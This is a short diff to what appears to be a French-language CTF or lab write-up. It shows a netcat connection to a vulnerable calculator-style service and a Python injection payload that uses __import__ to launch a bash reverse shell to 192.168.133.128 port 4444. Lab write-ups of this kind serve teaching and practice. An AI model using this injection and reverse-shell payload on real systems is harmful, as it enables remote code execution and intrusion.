@@ -153,7 +153,7 @@ Y'a aucune protection en fait, plutôt que de saisir un calcul en tant que clien
 ─[✗]─[dashboard@parrot]─[~]
 └──╼ $nc 192.168.133.129 13337
 
-Hello(__import__('subprocess').getoutput("/bin/bash -i >& /dev/tcp/192.168.133.128/4444 0>&1"))
+Hello__import__('os').system("bash -c 'bash -i >& /dev/tcp/192.168.133.128/4444 0>&1'")
 
 ```
 Sur ma machine  
